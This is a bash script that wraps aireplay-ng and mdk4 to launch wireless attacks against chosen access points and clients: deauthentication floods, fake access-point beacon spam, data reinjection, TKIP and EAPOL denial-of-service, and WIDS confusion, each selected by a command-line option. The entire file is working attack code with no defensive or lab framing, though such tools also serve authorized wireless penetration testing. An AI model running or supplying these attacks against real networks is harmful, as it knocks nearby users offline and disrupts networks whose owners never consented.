#!/bin/bash

INTERFACE=""
ESSID=""
BSSID=""
MAC_CLIENT=""
TIME=""
OPTION=""
CHANNEL=""
STEALTH=""
FAKE_ESSIDS=""

while getopts "i:e:b:m:c:t:o:f:s" opt; do
  case "$opt" in
    i)  INTERFACE=$OPTARG;;
    e)  ESSID=$OPTARG;;
    b)  BSSID=$OPTARG;;
    m)  MAC_CLIENT=$OPTARG;;
    c)  CHANNEL=$OPTARG;;
    t)  TIME=$OPTARG;;
    o)  OPTION=$OPTARG;;
    f)  FAKE_ESSIDS=$OPTARG;;
    s)  STEALTH="1";; #Used to no broadcast deauthentication packets, only useful with mdk4
    esac
done


deauth_aireplay(){
    # REQUREMENTS: INTERFACE and (ESSID or BSSID)
    # Working mode:
    # Cannot perform hole automatic deauth of everything found
    # If only ESSID is given, broadcast desauth will be launch to the found BSSID using the given ESSID
    # If only the BSSID is given, broadcast desauth is launched
    # In this case Stealth flag doesn't do nothing as aireplay do not support it
    
    CMD="aireplay-ng -0 0"
    if [ "$ESSID" ]; then
        CMD="$CMD -e $ESSID"
    fi
    if [ "$BSSID" ]; then
        CMD="$CMD -a $BSSID"
    fi
    if [ "$MAC_CLIENT" ]; then
        CMD="$CMD -c $MAC_CLIENT"
    fi
    if [ "$TIME" ]; then
        CMD="timeout $TIME $CMD"
    fi
    CMD="$CMD $INTERFACE"

    echo Going to execute $CMD
    $CMD
}


deauth_mdk4(){
    # REQUREMENTS: INTERFACE
    # Working mode:
    # Can perform hole automatic deauth of everything found
    # If Stealth is used, no broadcast packet is sent

    CMD="mdk4 $INTERFACE d"
    if [ "$ESSID" ]; then
        CMD="$CMD -E $ESSID"
    fi
    if [ "$BSSID" ]; then
        CMD="$CMD -B $BSSID"
    fi
    if [ "$MAC_CLIENT" ]; then
        TEMPFILE="/tmp/victim$RANDOM"
        echo "$MAC_CLIENT" > $TEMPFILE
        CMD="$CMD -b $TEMPFILE"
    fi
    if [ "$TIME" ]; then
        CMD="timeout $TIME $CMD"
    fi
    if [ "$CHANNEL" ]; then
        CMD="$CMD -c $CHANNEL"
    fi
    if [ "$STEALTH" ]; then
        CMD="$CMD -x"
    fi

    echo "Going to execute $CMD"
    $CMD
}


fake_aps(){
    # REQUREMENTS: INTERFACE
    # Working mode:
    # Will send fake beacons of APs, if stealth mode is used, nonprintable chars and long names will be sent.
    CMD="mdk4 $INTERFACE b -w nwta -m"
    if [ "$TIME" ]; then
        CMD="timeout $TIME $CMD"
    fi
    if [ "$CHANNEL" ]; then
        CMD="$CMD -h -c $CHANNEL"
    fi
    if [ "$FAKE_ESSIDS" ]; then
        TEMPFILE="/tmp/essids$RANDOM"
        echo "$FAKE_ESSIDS" | sed "s/,/\n/g" > $TEMPFILE
        CMD="$CMD -f $TEMPFILE"
    else
        if ! [ "$STEALTH" ]; then
            CMD="$CMD -a"
        fi
    fi

    echo "Going to execute $CMD"
    $CMD
}


reinject_data(){
    # REQUREMENTS: INTERFACE and BSSID
    # Working mode: (Stealth and not stealth could be combined)
    # If stealth, capture and repeat packets from authenticated clients, else send random data from random clients.
    CMD="mdk4 $INTERFACE a -m"
    if [ "$TIME" ]; then
        CMD="timeout $TIME $CMD"
    fi
    if [ "$STEALTH" ]; then
        CMD="$CMD -i $BSSID"
    else
        CMD="$CMD -a $BSSID"
    fi

    echo "Going to execute $CMD"
    $CMD
}

TKIP_DoS(){
    # REQUREMENTS: INTERFACE and a WPA/TKIP AP
    # Working mode: (Stealth and not stealth could be combined)
    # If stealth, use intelligent replay
    CMD="mdk4 $INTERFACE m"
    if [ "$TIME" ]; then
        CMD="timeout $TIME $CMD"
    fi
    if [ "$BSSID" ]; then
        CMD="$CMD -t $BSSID"
    fi
    if [ "$STEALTH" ]; then
        CMD="$CMD -j"
    fi

    echo "Going to execute $CMD"
    $CMD
}


EAPOL_DoS(){
    # REQUREMENTS: INTERFACE and a EAP AP
    # Working mode: (Stealth and not stealth could be combined)
    # If stealth, use Logoff messages to kick clients
    CMD="mdk4 $INTERFACE e"
    if [ "$TIME" ]; then
        CMD="timeout $TIME $CMD"
    fi
    if [ "$BSSID" ]; then
        CMD="$CMD -t $BSSID"
    fi
    if [ "$STEALTH" ]; then
        CMD="$CMD -l"
    fi

    echo "Going to execute $CMD"
    $CMD
}


WIDS_confusion(){
    # REQUREMENTS: INTERFACE and BSSID/ESSID
    # Working mode: (Stealth and not stealth could be combined)
    # If no stealth, activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
    CMD="mdk4 $INTERFACE w"
    if [ "$TIME" ]; then
        CMD="timeout $TIME $CMD"
    fi
    if [ "$BSSID" ]; then
        CMD="$CMD -e $BSSID"
    elif [ "$ESSID" ]; then
        CMD="$CMD -e $ESSID"
    fi
    if ! [ "$STEALTH" ]; then
        CMD="$CMD -z"
    fi

    echo "Going to execute $CMD"
    $CMD
}


if [ "$OPTION" == "deauth_aireplay" ]; then
    deauth_aireplay
elif [ "$OPTION" == "deauth_mdk4" ]; then
    deauth_mdk4
elif [ "$OPTION" == "fake_aps" ]; then
    fake_aps
elif [ "$OPTION" == "reinject_data" ]; then
    reinject_data
elif [ "$OPTION" == "TKIP_DoS" ]; then
    TKIP_DoS
elif [ "$OPTION" == "EAPOL_DoS" ]; then
    EAPOL_DoS
elif [ "$OPTION" == "WIDS_confusion" ]; then
    WIDS_confusion
fi
